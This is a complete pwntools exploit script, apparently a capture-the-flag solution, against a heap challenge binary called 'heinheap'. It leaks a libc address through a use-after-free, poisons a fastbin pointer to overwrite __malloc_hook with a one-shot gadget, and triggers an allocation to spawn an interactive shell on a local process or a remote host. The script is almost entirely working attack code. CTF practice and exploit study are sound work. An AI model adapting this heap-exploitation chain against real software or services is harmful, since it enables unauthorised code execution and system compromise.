
from pwn import *

def alloc(idx, size, data):
	r.sendlineafter('Exit\n', '1')
	r.sendlineafter('Index: \n', str(idx))
	r.sendlineafter('size: \n', str(size))

	if size > len(data):
		data += '\n'
	r.sendafter('content: \n', data)

	return

def edit(idx, data, size):
	r.sendlineafter('Exit\n', '2')
	r.sendlineafter('Index: \n', str(idx))

	if size > len(data):
		data += '\n'
	r.sendafter('content: \n', data)

	return

def dump(idx):
	r.sendlineafter('Exit\n', '3')
	r.sendlineafter('Index: \n', str(idx))

	return u64(r.recv(6).ljust(8, '\x00'))

def free(idx):
	r.sendlineafter('Exit\n', '4')	
	r.sendlineafter('Index: \n', str(idx))

	return

def pwn():

	'''	--==[[ Fastbin attack method ]]==--'''

	# Buffer's address
	buf   = '0x' 
	buf  += r.recv(12)
	buf   = int(buf, 16)
	array = buf + 0x80

	alloc(0, 0x68, 'A'*8)  # 0
	alloc(1, 0x88, 'B'*8)  # 1
	alloc(2, 0x88, 'C'*8)  # 2
	
	free(1)

	# Abuse UAF
	leak     = dump(1)
	libc     = leak - 0x3c27b8
	mhook    = libc + 0x3c2740
	one_shot = libc + 0xea33d
	
	log.success('Array:  0x{:x}'.format(array))
	log.success('Buffer: 0x{:X}'.format(buf))
	log.success('Libc:   0x{:x}'.format(libc))
	log.success('mhook:  0x{:x}'.format(mhook))	

	free(0)

	# Overwrite fastbin's fd with &__malloc_hook - 0x30 + 0xd
	# so that on the 2nd allocation we'll get back
	# its address and we will be able to overwrite it.
	edit(0, p64(mhook - 0x30 + 0xd), 0x88)

	alloc(3, 0x68, 'D'*8)  # 3
	# __malloc_hook => one shot gadget
	alloc(4, 0x68, 'E'*0x13 + p64(one_shot))  # 4

	# Trigger __malloc_hook by requesting a new allocation
	r.sendlineafter('Exit\n', '1')
	r.sendlineafter('Index: \n', '5')
	r.sendlineafter('size: \n', str(0x20))

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        r = process('./heinheap')
        pause()
        pwn()
